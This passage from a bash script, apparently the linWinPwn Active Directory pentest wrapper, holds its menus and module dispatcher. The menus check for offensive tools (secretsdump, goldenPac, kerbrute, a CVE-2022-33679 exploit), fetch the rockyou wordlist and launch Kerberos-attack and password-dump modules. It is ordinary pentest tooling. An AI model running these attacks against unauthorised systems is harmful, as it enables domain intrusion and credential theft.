    echo -e "${YELLOW}[Config menu]${NC} Please choose from the following options:"
    echo -e "------------------------------------------------------"
    echo -e "ENTER) Go back to Init Menu"
    echo -e "1) Check installation of tools and dependencies"
    echo -e "2) Change output folder"
    echo -e "3) Synchronize time with Domain Controller (requires root)"
    echo -e "4) Add Domain Controller's IP and Domain to /etc/hosts (requires root)"
    echo -e "5) Update resolv.conf to define Domain Controller as DNS server (requires root)"
    echo -e "6) Switch between LDAP (port 389) and LDAPS (port 636)"
    echo -e "7) Download default username and password wordlists (non-kali machines)"
    echo -e "8) Change users wordlist file"
    echo -e "9) Change passwords wordlist file"
    echo -e "10) Change attacker's IP"
    echo -e "11) Show session information"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        1)
        echo -e ""
        if [ ! -f "${impacket_findDelegation}" ] ; then echo -e "${RED}[-] impacket's findDelegation is not installed${NC}"; else echo -e "${GREEN}[+] impacket's findDelegation is installed${NC}"; fi
        if [ ! -f "${impacket_GetUserSPNs}" ] ; then echo -e "${RED}[-] impacket's GetUserSPNs is not installed${NC}"; else echo -e "${GREEN}[+] impacket's GetUserSPNs is installed${NC}"; fi
        if [ ! -f "${impacket_secretsdump}" ] ; then echo -e "${RED}[-] impacket's secretsdump is not installed${NC}"; else echo -e "${GREEN}[+] impacket's secretsdump is installed${NC}"; fi
        if [ ! -f "${impacket_GetNPUsers}" ] ; then echo -e "${RED}[-] impacket's GetNPUsers is not installed${NC}"; else echo -e "${GREEN}[+] impacket's GetNPUsers is installed${NC}"; fi
        if [ ! -f "${impacket_getTGT}" ] ; then echo -e "${RED}[-] impacket's getTGT is not installed${NC}"; else echo -e "${GREEN}[+] impacket's getTGT is installed${NC}"; fi
        if [ ! -f "${impacket_goldenPac}" ] ; then echo -e "${RED}[-] impacket's goldenPac is not installed${NC}"; else echo -e "${GREEN}[+] impacket's goldenPac is installed${NC}"; fi
        if [ ! -f "${impacket_rpcdump}" ] ; then echo -e "${RED}[-] impacket's rpcdump is not installed${NC}"; else echo -e "${GREEN}[+] impacket's rpcdump is installed${NC}"; fi
        if [ ! -f "${impacket_reg}" ] ; then echo -e "${RED}[-] impacket's reg is not installed${NC}"; else echo -e "${GREEN}[+] impacket's reg is installed${NC}"; fi
        if [ ! -f "${impacket_ticketer}" ] ; then echo -e "${RED}[-] impacket's ticketer is not installed${NC}"; else echo -e "${GREEN}[+] impacket's ticketer is installed${NC}"; fi
        if [ ! -f "${bloodhound}" ] ; then echo -e "${RED}[-] bloodhound is not installed${NC}"; else echo -e "${GREEN}[+] bloodhound is installed${NC}"; fi
        if [ ! -f "${ldapdomaindump}" ] ; then echo -e "${RED}[-] ldapdomaindump is not installed${NC}"; else echo -e "${GREEN}[+] ldapdomaindump is installed${NC}"; fi
        if [ ! -f "${netexec}" ] ; then echo -e "${RED}[-] netexec is not installed${NC}"; else echo -e "${GREEN}[+] netexec is installed${NC}"; fi
        if [ ! -f "${john}" ] ; then echo -e "${RED}[-] john is not installed${NC}"; else echo -e "${GREEN}[+] john is installed${NC}"; fi
        if [ ! -f "${smbmap}" ] ; then echo -e "${RED}[-] smbmap is not installed${NC}"; else echo -e "${GREEN}[+] smbmap is installed${NC}"; fi
        if [ ! -f "${nmap}" ] ; then echo -e "${RED}[-] nmap is not installed${NC}"; else echo -e "${GREEN}[+] nmap is installed${NC}"; fi
        if [ ! -f "${adidnsdump}" ] ; then echo -e "${RED}[-] adidnsdump is not installed${NC}"; else echo -e "${GREEN}[+] adidnsdump is installed${NC}"; fi
        if [ ! -f "${certi_py}" ] ; then echo -e "${RED}[-] certi_py is not installed${NC}"; else echo -e "${GREEN}[+] certi_py is installed${NC}"; fi
        if [ ! -f "${certipy}" ] ; then echo -e "${RED}[-] certipy is not installed${NC}"; else echo -e "${GREEN}[+] certipy is installed${NC}"; fi
        if [ ! -f "${ldeep}" ] ; then echo -e "${RED}[-] ldeep is not installed${NC}"; else echo -e "${GREEN}[+] ldeep is installed${NC}"; fi
        if [ ! -f "${pre2k}" ] ; then echo -e "${RED}[-] pre2k is not installed${NC}"; else echo -e "${GREEN}[+] pre2k is installed${NC}"; fi
        if [ ! -f "${certsync}" ] ; then echo -e "${RED}[-] certsync is not installed${NC}"; else echo -e "${GREEN}[+] certsync is installed${NC}"; fi
        if [ ! -f "${windapsearch}" ] ; then echo -e "${RED}[-] windapsearch is not installed${NC}"; else echo -e "${GREEN}[+] windapsearch is installed${NC}"; fi
        if [ ! -x "${windapsearch}" ] ; then echo -e "${RED}[-] windapsearch is not executable${NC}"; else echo -e "${GREEN}[+] windapsearch is executable${NC}"; fi
        if [ ! -f "${enum4linux_py}" ] ; then echo -e "${RED}[-] enum4linux-ng is not installed${NC}"; else echo -e "${GREEN}[+] enum4linux-ng is installed${NC}"; fi
        if [ ! -x "${enum4linux_py}" ] ; then echo -e "${RED}[-] enum4linux-ng is not executable${NC}"; else echo -e "${GREEN}[+] enum4linux-ng is executable${NC}"; fi
        if [ ! -f "${kerbrute}" ] ; then echo -e "${RED}[-] kerbrute is not installed${NC}"; else echo -e "${GREEN}[+] kerbrute is installed${NC}"; fi
        if [ ! -x "${kerbrute}" ] ; then echo -e "${RED}[-] kerbrute is not executable${NC}"; else echo -e "${GREEN}[+] kerbrute is executable${NC}"; fi
        if [ ! -f "${targetedKerberoast}" ] ; then echo -e "${RED}[-] targetedKerberoast is not installed${NC}"; else echo -e "${GREEN}[+] targetedKerberoast is installed${NC}"; fi
        if [ ! -x "${targetedKerberoast}" ] ; then echo -e "${RED}[-] targetedKerberoast is not executable${NC}"; else echo -e "${GREEN}[+] targetedKerberoast is executable${NC}"; fi
        if [ ! -f "${CVE202233679}" ] ; then echo -e "${RED}[-] CVE-2022-33679 is not installed${NC}"; else echo -e "${GREEN}[+] CVE-2022-33679 is installed${NC}"; fi
        if [ ! -x "${CVE202233679}" ] ; then echo -e "${RED}[-] CVE-2022-33679 is not executable${NC}"; else echo -e "${GREEN}[+] CVE-2022-33679 is executable${NC}"; fi
        if [ ! -f "${donpapi}" ] ; then echo -e "${RED}[-] DonPAPI is not installed${NC}"; else echo -e "${GREEN}[+] DonPAPI is installed${NC}"; fi
        if [ ! -f "${hekatomb}" ] ; then echo -e "${RED}[-] HEKATOMB is not installed${NC}"; else echo -e "${GREEN}[+] hekatomb is installed${NC}"; fi
        if [ ! -f "${FindUncommonShares}" ] ; then echo -e "${RED}[-] FindUncommonShares is not installed${NC}"; else echo -e "${GREEN}[+] FindUncommonShares is installed${NC}"; fi
        if [ ! -f "${manspider}" ] ; then echo -e "${RED}[-] manspider is not installed${NC}"; else echo -e "${GREEN}[+] manspider is installed${NC}"; fi
        if [ ! -f "${coercer}" ] ; then echo -e "${RED}[-] coercer is not installed${NC}"; else echo -e "${GREEN}[+] coercer is installed${NC}"; fi
        if [ ! -f "${bloodyad}" ] ; then echo -e "${RED}[-] bloodyad is not installed${NC}"; else echo -e "${GREEN}[+] bloodyad is installed${NC}"; fi
        config_menu
        ;;

        2)
        echo -e ""
        echo -e "Please specify new output folder:"
        read -p ">> " output_dir_new </dev/tty
        if [ ! "${output_dir_new}" == "" ]; then
            mkdir -p $output_dir_new 2>/dev/null
            output_dir=$output_dir_new
            echo -e "${GREEN}[+] Output folder updated${NC}"
        else
            echo -e "${RED}[-] Error updating output folder${NC}"
        fi
        config_menu
        ;;

        3)
        echo -e ""
        sudo timedatectl set-ntp 0
        sudo ntpdate ${dc_ip}
        echo -e "${GREEN}[+] NTP sync complete${NC}"
        config_menu
        ;;

        4)
        echo -e "# /etc/hosts entry added by linWinPwn" | sudo tee -a /etc/hosts
        echo -e "${dc_ip}\t${dc_domain} ${dc_FQDN} ${dc_NETBIOS}" | sudo tee -a /etc/hosts
        echo -e "${GREEN}[+] /etc/hosts update complete${NC}"
        config_menu
        ;;

        5)
        echo -e ""
        echo -e "Content of /etc/resolv.conf before update:"
        echo -e "------------------------------------------"
        cat /etc/resolv.conf
        sudo sed -i '/^#/! s/^/#/g' /etc/resolv.conf
        echo -e "nameserver ${dc_ip}" | sudo tee -a /etc/resolv.conf
        echo -e "${GREEN}[+] DNS update complete${NC}"
        config_menu
        ;;

        6)
        if [ "${ldaps_bool}" == false ]; then
            ldaps_bool=true
            echo -e "${GREEN}[+] Switched to using LDAPS on port 636${NC}"

        else
            ldaps_bool=false
            echo -e "${GREEN}[+] Switched to using LDAP on port 389${NC}"
        fi
        config_menu
        ;;

        7)
        echo -e ""
        sudo mkdir -p ${wordlists_dir} 
        sudo chown -R $(whoami) ${wordlists_dir}
        wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz" -O "${wordlists_dir}/rockyou.txt.tar.gz"
        gunzip "${wordlists_dir}/rockyou.txt.tar.gz"
        tar xf "${wordlists_dir}/rockyou.txt.tar" -C "${wordlists_dir}/"
        chmod 644 "${wordlists_dir}/rockyou.txt"
        /bin/rm "${wordlists_dir}/rockyou.txt.tar"
        wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/cirt-default-usernames.txt" -O "${wordlists_dir}/cirt-default-usernames.txt"
        pass_wordlist="${wordlists_dir}/rockyou.txt"
        users_wordlist="${wordlists_dir}/xato-net-10-million-usernames.txt"
        echo -e "${GREEN}[+] Default username and password wordlists downloaded${NC}"
        config_menu
        ;;

        8)
        echo -e "Please specify new users wordlist file:"
        read -p ">> " users_wordlist </dev/tty
        echo -e "${GREEN}[+] Users wordlist file updated${NC}"
        config_menu
        ;;

        9)
        echo -e "Please specify new passwords wordlist file:"
        read -p ">> " pass_wordlist </dev/tty
        echo -e "${GREEN}[+] Passwords wordlist file updated${NC}"
        config_menu
        ;;

        10)
        echo ""
        set_attackerIP
        config_menu
        ;;

        11)
        echo ""
        print_info
        config_menu
        ;;

        "")
        init_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        config_menu
        ;;
    esac
}

main_menu () {
    echo -e ""
    echo -e "${PURPLE}[Main menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------"
    echo -e "1) Re-run DNS Enumeration using adidnsdump"
    echo -e "2) Active Directory Enumeration Menu"
    echo -e "3) Kerberos Attacks Menu"
    echo -e "4) SMB shares Enumeration Menu"
    echo -e "5) Vulnerability Checks Menu"
    echo -e "6) Password Dump Menu"
    echo -e "7) Run MSSQL Enumeration"
    echo -e "99) Quit"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in

        1)
        /bin/rm ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null
        dns_enum
        main_menu
        ;;

        2)
        ad_menu
        ;;

        3)
        kerberos_menu
        ;;

        4)
        shares_menu
        ;;

        5)
        vulns_menu
        ;;

        6)
        pwd_menu
        ;;

        7)
        mssql_enum
        main_menu
        ;;

        99)
        exit 1
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        main_menu
        ;;
    esac
}

main () { 
    print_banner
    prepare
    print_info
    authenticate
    run_command "${netexec} ldap ${target} ${argument_ne} --get-sid --log ${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt" > /dev/null
    sid_domain=$(/bin/cat ${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt 2>/dev/null | grep "Domain SID" | head -n 1 | sed 's/[ ][ ]*/ /g' | cut -d " " -f 12)
    echo -e "${YELLOW}[i]${NC} SID of Domain: ${YELLOW}${sid_domain}${NC}"
    echo -e ""
    if [[ "$modules" == *"interactive"* ]]; then
        modules="interactive"
        init_menu
    elif [[ "$modules" == "" ]]; then
        echo -e "${RED}[-] No modules specified${NC}"
        echo -e "Use -h for help"
        exit 1
    else
        dns_enum
        for i in $(echo $modules | sed "s/,/ /g"); do
            case $i in
                ad_enum)
                echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
                echo -e "${GREEN}------------------------------------------------${NC}"
                echo -e ""
                ad_enum
                echo -e ""
                ;;

                kerberos)
                echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
                echo -e "${GREEN}------------------------------------------${NC}"
                echo -e ""
                kerberos
                echo -e ""
                ;;

                scan_shares)
                echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
                echo -e "${GREEN}---------------------------------------${NC}"
                echo -e ""
                scan_shares
                ;;

                pwd_dump)
                echo -e "${GREEN}[+] Module Started: Password Dump${NC}"
                echo -e "${GREEN}---------------------------------${NC}"
                echo -e ""
                pwd_dump
                ;;

                mssql_enum)
                echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
                echo -e "${GREEN}-------------------------------------${NC}"
                echo -e ""
                mssql_enum
                echo -e ""
                ;;

                vuln_checks)
                echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
                echo -e "${GREEN}----------------------------------------${NC}"
                echo -e ""
                vuln_checks
                echo -e ""
                ;;

                all)
                echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
                echo -e "${GREEN}------------------------------------------------${NC}"
                echo -e ""
                ad_enum
                echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
                echo -e "${GREEN}------------------------------------------${NC}"
                echo -e ""
                kerberos
                echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
                echo -e "${GREEN}---------------------------------------${NC}"
                echo -e ""
                scan_shares
                echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
                echo -e "${GREEN}----------------------------------------${NC}"
                echo -e ""
                vuln_checks
                echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
                echo -e "${GREEN}-------------------------------------${NC}"
                echo -e ""
                mssql_enum
                echo -e "${GREEN}[+] Module Started: Password Dump${NC}"
                echo -e "${GREEN}---------------------------------${NC}"
                echo -e ""
                pwd_dump
                ;;

                user)
                echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
                echo -e "${GREEN}------------------------------------------------${NC}"
                echo -e ""
                ad_enum
                echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
                echo -e "${GREEN}------------------------------------------${NC}"
                echo -e ""
                kerberos
                echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
                echo -e "${GREEN}---------------------------------------${NC}"
                echo -e ""
                scan_shares
                echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
                echo -e "${GREEN}----------------------------------------${NC}"
                echo -e ""
                vuln_checks
                echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
                echo -e "${GREEN}-------------------------------------${NC}"
                echo -e ""
                mssql_enum
                ;;

                *)
                echo -e "${RED}[-] Unknown module $i... ${NC}"
                echo -e ""
                ;;
            esac
        done

        echo -e ""
        echo -e "${GREEN}[+] All modules have completed. Output folder is: ${output_dir}${NC}"
        echo -e "${GREEN}-------------------------------------------------${NC}"

    fi
}

main
